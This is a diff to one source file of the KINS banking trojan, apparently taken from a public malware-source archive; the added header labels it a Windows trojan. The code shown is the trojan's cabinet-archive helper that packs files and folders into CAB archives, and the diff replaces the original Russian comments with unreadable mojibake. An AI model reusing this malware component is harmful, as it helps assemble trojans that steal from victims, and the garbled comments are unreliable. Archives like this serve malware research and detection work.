@@ -1,3 +1,14 @@
+/*
+  name      KINS
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 #include <shlwapi.h>
 #include <fcntl.h>
@@ -47,10 +58,10 @@ typedef struct
   ERF error;
   CCAB cab;
   
-  bool bCurrentFileNameAsAnsi;    //Сохранять имя файла в ANSI кодировки.
-  WCHAR strCurrentFile[MAX_PATH]; //Текущий файл для сжатия.
-  WCHAR strOutputFile[MAX_PATH];  //Текущий файл архива.
-  WCHAR strTempPath[MAX_PATH];    //Временная папка.
+  bool bCurrentFileNameAsAnsi;    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ ANSI пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  WCHAR strCurrentFile[MAX_PATH]; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
+  WCHAR strOutputFile[MAX_PATH];  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
+  WCHAR strTempPath[MAX_PATH];    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
 }FCIDATA;
 #endif
 
@@ -65,8 +76,8 @@ typedef struct
 #endif
 
 static DWORD ref_count;
-static HANDLE hMsCabHeap; //Данная гениальная библиотека с 93-го года не научилась убирать за собой свой
-                     //мусор поэтому я создаю для нее отдельную кучу.
+static HANDLE hMsCabHeap; //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ 93-пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
+                     //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
 static HMODULE hDll;
 
 #if(XLIB_MSCAB_FCI > 0)
@@ -143,7 +154,7 @@ static INT_PTR __FxIOpen(LPWSTR pszFile, int oflag, int pmode)
     if(p == NULL)CWA(kernel32, CloseHandle)(h);
     else
     {
-      p->fileName = Str::_CopyExW(pszFile, -1); //Это параметр не критичен, не проверяем его.
+      p->fileName = Str::_CopyExW(pszFile, -1); //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ.
       p->handle = h;
       p->oflags = oflag;
       return (INT_PTR)p;
@@ -216,12 +227,12 @@ static bool PathToNormal(LPSTR pszPath, LPWSTR pBuffer, void *pv)
   }
   else if(Mem::_compare(pszPath, STR_TEMP_FILE, STR_TEMP_FILE_SIZE) == 0)
   {
-    //Имена временных файлов всегда состоят из US символов, поэтому работа с UTF8 не требуется.
+    //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ US пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ UTF8 пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
     WCHAR path[MAX_PATH];
     Str::_ansiToUnicode(pszPath + STR_TEMP_FILE_SIZE + 1, -1, path, MAX_PATH);
     if(!Fs::_pathCombine(pBuffer, ((FCIDATA *)pv)->strTempPath, path))r = false;
   }
-  else r = false; //Другие пути не поддерживаются.
+  else r = false; //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
   return r;
 }
@@ -267,7 +278,7 @@ static BOOL DIAMONDAPI __FCITempFile(char *pszTempName, int cbTempName, void *pv
 
   if(CWA(kernel32, GetTempFileNameW)(p->strTempPath, L"cab", 0, file) > 0 && Fs::_removeFile(file))
   {
-    //Имена временных файлов всегда состоят из US символов, поэтому работа с UTF8 не требуется.
+    //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ US пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ UTF8 пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
     Str::_unicodeToAnsi(CWA(shlwapi, PathFindFileNameW)(file), -1, pszTempName + STR_TEMP_FILE_SIZE + 1, cbTempName - (STR_TEMP_FILE_SIZE + 1));
     Mem::_copy(pszTempName, STR_TEMP_FILE, STR_TEMP_FILE_SIZE);
     pszTempName[STR_TEMP_FILE_SIZE] = '\\';
@@ -305,7 +316,7 @@ static INT_PTR DIAMONDAPI __FCIOpenInfo(char *pszName, USHORT *pdate, USHORT *pt
       CWA(kernel32, FileTimeToLocalFileTime)(&inf.ftLastWriteTime, &ft);
       CWA(kernel32, FileTimeToDosDateTime)(&ft, pdate, ptime);
       
-      //Атрибуты FILE_ATTRIBUTE_* совпадают с _A_*.
+      //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ FILE_ATTRIBUTE_* пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ _A_*.
       *pattribs = (USHORT)(inf.dwFileAttributes & (FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_ARCHIVE));
       if(p->bCurrentFileNameAsAnsi == false)*pattribs |=_A_NAME_IS_UTF;
       r = (INT_PTR)pd;
@@ -447,7 +458,7 @@ void *MsCab::FCICreate(LPWSTR pstrPath, LPWSTR pstrFile, LPWSTR pstrTempPath)
           p->cab.iCab           = 1;
           p->cab.iDisk          = 1;
           //p->cab.setID          = 0;
-          Mem::_copy(p->cab.szCab, MSCAB_DLL, sizeof(MSCAB_DLL)); //Не имеет смысла.
+          Mem::_copy(p->cab.szCab, MSCAB_DLL, sizeof(MSCAB_DLL)); //пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
           Mem::_copy(p->cab.szCabPath, STR_OUTPUT_FILE, STR_OUTPUT_FILE_SIZE);
 
           p->hFCI = mf_FciCreate(&p->error, __FCIFileDest, __FxIAlloc, __FxIFree, __FCIOpen, __FCIRead, __FCIWrite, __FCIClose, __FCISeek, __FCIDelete, __FCITempFile, &p->cab, p);
@@ -532,7 +543,7 @@ bool MsCab::createFromFolder(LPWSTR outputFile, LPWSTR sourceFolder, LPWSTR temp
     cs.filesCount    = 0;
     cs.cabPathOffset = Str::_LengthW(sourceFolder);
     
-    //Если путь не кончается на слеш.
+    //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ.
     if(cs.cabPathOffset > 0 && sourceFolder[cs.cabPathOffset - 1] != '\\')cs.cabPathOffset++;
 
     Fs::_findFiles(sourceFolder, fileMask, fileMaskCount, (flags & MsCab::CFF_RECURSE ? Fs::FFFLAG_RECURSIVE : 0) | Fs::FFFLAG_SEARCH_FILES, createFromFolderProc, &cs, NULL, 0, 0);
